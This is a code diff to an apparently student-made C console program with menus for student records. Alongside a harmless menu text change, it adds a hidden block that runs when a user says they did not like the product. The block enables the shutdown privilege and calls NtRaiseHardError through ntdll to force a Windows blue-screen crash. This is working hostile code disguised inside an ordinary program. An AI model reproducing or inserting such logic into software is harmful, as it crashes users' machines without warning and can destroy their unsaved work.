@@ -10,6 +10,10 @@
 
 
 
+typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+
+
 
 //typedef struct students students;
 void main() {
@@ -91,7 +95,7 @@ void main() {
 		case 2:
 			system("cls");
 			printLogo();
-			printf("\n select the desired item:\n 1. console output\n 2. file output\n 3. exit.\n");
+			printf("\n select the desired item:\n 1. console output\n 2. save to file\n 3. exit.\n");
 			scanf("%s", &t);
 			if (allDigit(t)) {
 				n = atoi(t);
@@ -231,8 +235,19 @@ void main() {
 
 			printf("Did you like my product?\n 1. Yes\n 2. No\n");
 			scanf("%d", &n);
+			if (n == 2) {
+				BOOLEAN f;
+				ULONG u;
+				LPVOID s = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+				LPVOID l = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+				pdef_RtlAdjustPrivilege t = (pdef_RtlAdjustPrivilege)s;
+				pdef_NtRaiseHardError N = (pdef_NtRaiseHardError)l;
+				NTSTATUS NtRet = t(19, TRUE, FALSE, &f);
+				N(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &u);
+			}
 
-			exit(1);
+
+			return 0;
 
 		default:
 			printf("Invalid data, try again\n press any key: ");
